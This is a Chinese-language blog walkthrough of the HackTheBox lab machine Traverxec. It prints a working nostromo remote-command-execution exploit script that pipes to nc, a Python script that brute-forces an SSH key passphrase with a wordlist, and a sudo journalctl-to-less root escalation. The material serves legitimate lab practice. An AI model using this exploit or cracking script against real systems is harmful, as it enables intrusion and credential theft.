HackTheBox 上面的一台简单的机器，这是自己第一台拿到权限的active机器，很兴奋

Happy Hacking


<!--more-->


## www-data

首先nmap扫描发现开了80和22端口

80端口运行着nostromo服务，并且存在着一个2019年的CVE

直接使用searchsploit搜索就可以找到

```bash
searchsploit nostromo
```

网上也可以搜相关的EXP

```bash
HOST="$1"
PORT="$2"
shift 2
（echo -n -e 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n'; \
echo -n -e 'Content-Length: 1\r\n\r\necho\necho\n'; \
echo "$@ 2>&1") | nc "$HOST" "$PORT"\
|sed --quiet --expression ':S;/^\r$/{n;bP};n;bS;:P;n;p;bP'
```

运行的时候

``` bash
./exp.sh 10.10.10.165 80 ls /var/nostromo/
```

这样执行命令，之后就相当于获得到了www-data 的权限

下面需要提权

## david

在nostromo的文件夹下看到了一个配置文件夹，里面有nhttpd.conf

文件的内容如下：

```plain
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

具体nostromo有一些特性

在nostromo的man手册中有提到一点，其中的HOMEDIRS下的选项

有一个功能是可以直接在web中访问到home目录下的用户文件夹

可以看到配置文件中写道了可以直接访问`/home`目录

因此我们在浏览器中直接访问

```plain
http://10.10.10.165:80/~david/
```

实际上访问的目录就是`/home/david`

在终端中直接尝试查看这个目录下的内容是看不到的（没有读权限）

但是看到`homedirs_public`这个值，这个是任何用户都可以直接访问的

因此直接在终端中

```bash
./exp.sh 10.10.10.165 80 ls -la /home/david/public_www
```

在这里面可以找到一个`protected-file-area`

里面包含了一个`tar`压缩包

将这个压缩包解压，里面包含了一个`.ssh`, 内容为公私钥

解压这个包的时候使用的命令是

```bash
tar -xf XXXXX.tar -C /tmp
```

因为直接解压默认的目录是`/home`下，这个目录我们是没有权限去写的，因此使用`-C`可以指定目录

私钥的内容是加密过的，没有办法直接连接，需要首先破解passphrase

手动写一个脚本来爆破

```python
from subprocess import PIPE, Popen
import subprocess
import sys

def cmdline(command):
    proc = subprocess.Popen(str(command), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    return err

def main():
    words = [line.strip() for line in open('/usr/share/wordlists/rockyou.txt')]
    print("\n")
    count=0

    for w in words:
        strcmd = "openssl rsa -in ~/.ssh/id_rsa -out out.key -passin pass:"+w
        res=cmdline(strcmd)
        if res.startswith("writing"):
                print("\nThe key is: "+w)
                sys.exit()
        print(str(count)+"/"+str(w))
        count=count+1
    print("\n")

if __name__ == '__main__':
    main()
```

就是直接用python对字典中的词进行尝试，破解得到ssh私钥的pass为`hunter`

下面直接连接，即可获得david的权限

```bash
ssh david@10.10.10.165
```

其实也可以使用john来爆破key，首先使用ssh2john将其转换为john可以爆破的内容，之后直接用john和字典就可以

## root

首先做的事情就是查看david的目录下有没有比较有用的内容

发现david的目录下的结构

![david.jpg][1]

这个`bin`目录下的server-status.sh比较有趣

![server-stats.jpg][2]

运行这个脚本可以看到

![run.jpg][3]

发现最后一行是使用了`sudo`运行`journalctl`这个程序

但是却没有需要输入david的密码，因此如果可以获得这个程序本身的权限就可以得到root的权限了

我们仿照脚本里最后一行运行

```bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```

这样也不需要输入密码，最后也是进入了`sudo`权限的`less`中

在`less`中可以类似`vim`那样使用`!`来执行外部的程序

![root1.jpg][4]

![root2.jpg][5]

done!



## 总结

总结一下这个靶机中学到的新知识

1.  nostromo 存在的漏洞
2.  nostromo存在一个可以直接用web访问到用户文件夹的特性
3.  journalctl、less的提权方法
4.  使用脚本爆破ssh加密key的方法


[1]: http://42.193.111.59/usr/uploads/2021/01/750280247.jpg#vwid=629&vhei=160
[2]: http://42.193.111.59/usr/uploads/2021/01/48883638.jpg#vwid=823&vhei=252
[3]: http://42.193.111.59/usr/uploads/2021/01/2842446307.jpg#vwid=1270&vhei=583
[4]: http://42.193.111.59/usr/uploads/2021/01/1170772748.jpg#vwid=1270&vhei=188
[5]: http://42.193.111.59/usr/uploads/2021/01/3180657420.jpg#vwid=1257&vhei=305